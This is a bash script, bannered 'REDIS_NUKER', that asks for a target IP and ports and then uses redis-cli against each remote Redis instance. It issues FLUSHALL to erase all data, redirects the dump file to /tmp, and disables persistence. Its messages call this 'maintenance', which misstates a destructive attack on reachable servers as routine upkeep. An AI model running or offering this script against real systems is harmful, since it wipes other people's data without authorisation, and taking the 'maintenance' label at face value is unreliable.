#!/bin/bash
clear

# Terminal colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${RED}"
cat <<'EOF'


 ___  ___  ___  _  ___       _ _  _ _  _ __ ___  ___ 
| . \| __>| . \| |/ __>     | \ || | || / /| __>| . \
|   /| _> | | || |\__ \ ___ |   || ' ||  \ | _> |   /
|_\_\|___>|___/|_|<___/|___||_\_|`___'|_\_\|___>|_\_\

    
EOF
echo -e "${NC}"


read -r -p "Enter Target IP: " TARGET

read -r -p "Enter Ports (space separated): " -a PORTS


if [[ -z "$TARGET" || ${#PORTS[@]} -eq 0 ]]; then
    echo -e "${RED}Error: Missing IP or Ports.${NC}"
    exit 1
fi

echo -e "\n${YELLOW}Starting Redis maintenance on $TARGET...${NC}\n"

for port in "${PORTS[@]}"; do
    
    port=$(echo "$port" | tr -d '[:cntrl:]')
    
    echo -e "${GREEN}[+] Processing Port: $port${NC}"
    
    
    redis-cli -h "$TARGET" -p "$port" FLUSHALL ASYNC
    redis-cli -h "$TARGET" -p "$port" CONFIG SET dir /tmp
    redis-cli -h "$TARGET" -p "$port" CONFIG SET dbfilename "reverted.rdb"
    redis-cli -h "$TARGET" -p "$port" SAVE
    redis-cli -h "$TARGET" -p "$port" CONFIG SET save ""
    redis-cli -h "$TARGET" -p "$port" CONFIG SET appendonly no
done

echo -e "\n${GREEN}✔ Maintenance Complete.${NC}"
